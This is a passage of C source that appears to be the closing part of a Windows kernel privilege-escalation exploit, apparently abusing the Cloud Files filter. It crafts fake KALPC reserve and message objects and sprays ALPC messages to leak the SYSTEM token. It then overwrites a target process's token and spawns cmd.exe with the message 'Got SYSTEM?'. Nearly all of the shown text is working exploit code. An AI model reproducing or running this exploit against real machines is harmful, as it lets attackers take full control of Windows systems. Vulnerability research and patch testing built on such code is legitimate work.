		ALPC_MESSAGE* alpcMessage = (ALPC_MESSAGE*)calloc(1, sizeof(ALPC_MESSAGE));
		alpcMessage->PortHeader.u1.s1.DataLength = DataLength;
		alpcMessage->PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + DataLength;
		alpcMessage->PortHeader.MessageId = (ULONG)g_hResource;
		ULONG_PTR* pAlpcMsgData = (ULONG_PTR*)((BYTE*)alpcMessage + sizeof(PORT_MESSAGE));
		pAlpcMsgData[0] = ullSystemEPROCaddr; // AttributeValue
		pAlpcMsgData[1] = 0x00787878;		  // name
		for (int i = 0; i < portsCount; i++) {
			ntRet = NtAlpcSendWaitReceivePort(ports[i], ALPC_MSGFLG_NONE, (PPORT_MESSAGE)alpcMessage, NULL, NULL, NULL, NULL, NULL);
			if (!NT_SUCCESS(ntRet)) {
				printf("[-] NtAlpcSendWaitReceivePort failed\n");
				break;
			}
		}

		// read system token
		bRet = PipeReadAttr(pipeName, outputData, 0x1000);
		if (!bRet) {
			printf("[-] PipeReadAttr failed\n");
			break;
		}

		ullToken = *(ULONG_PTR*)(outputData + g_ulTokenOffset);
		printf("[*] TOKEN: %p\n", ullToken);

		tmpEntry = fakeKalpcMessage->Entry;

		if (!isKernAddr(ullToken)) {
			printf("[-] Wrong token address\n");
			break;
		}

		memset(fakeKalpcReserveObject, 0, sizeof(KALPC_RESERVE) + 0x20);
		memset(fakeKalpcMessageObject, 0, sizeof(KALPC_MESSAGE) + 0x20);
		fakeKalpcReserveObject[1] = 0x7;
		fakeKalpcReserveObject[8] = 0x1;
		fakeKalpcMessageObject[8] = 0x1;

		fakeKalpcReserve->Size = 0x28;
		fakeKalpcReserve->Message = fakeKalpcMessage;

		fakeKalpcMessage->Reserve = fakeKalpcReserve;
		fakeKalpcMessage->ExtensionBuffer = (BYTE*)ullEPROCaddr + g_ulTokenOffset;
		fakeKalpcMessage->ExtensionBufferSize = 8;

		DataLength = 8;
		memset(alpcMessage, 0, sizeof(ALPC_MESSAGE));
		alpcMessage->PortHeader.u1.s1.DataLength = DataLength;
		alpcMessage->PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + DataLength;
		alpcMessage->PortHeader.MessageId = (ULONG)g_hResource;
		pAlpcMsgData[0] = ullToken;
		for (int i = 0; i < portsCount; i++) {
			NtAlpcSendWaitReceivePort(ports[i], ALPC_MSGFLG_NONE, (PPORT_MESSAGE)alpcMessage, NULL, NULL, NULL, NULL, NULL);
		}
		fakeKalpcMessage->Entry = tmpEntry;


		if (runCmd) {
			bRet = CreateProcess(
				L"C:\\Windows\\System32\\cmd.exe",
				NULL,
				NULL,
				NULL,
				FALSE,
				CREATE_NEW_CONSOLE,
				NULL,
				NULL,
				&StartupInfo,
				&ProcessInformation
			);
			if (!bRet) {
				printf("[-] Failed to Create Target Process: 0x%X\n", GetLastError());
				break;
			}
		}

		printf("[*] Got SYSTEM?\n");
		ulExitCode = 0;
	}
	while (0);

	if (hF)
		CloseHandle(hF);
	CfUnregisterSyncRoot(dir);

	if (g_hReadPipe)
		CloseHandle(g_hReadPipe);
	if (g_hWritePipe)
		CloseHandle(g_hWritePipe);

	if (ports[0]) {
		for (int i = 0; i < portsCount; i++)
			CloseHandle(ports[i]);
	}

	if (ProcessInformation.hProcess)
		WaitForSingleObject(ProcessInformation.hProcess, INFINITE);

	printf("[*] Bye\n");

	// reclaim memory
	Sleep(2000);

	return ulExitCode;
}
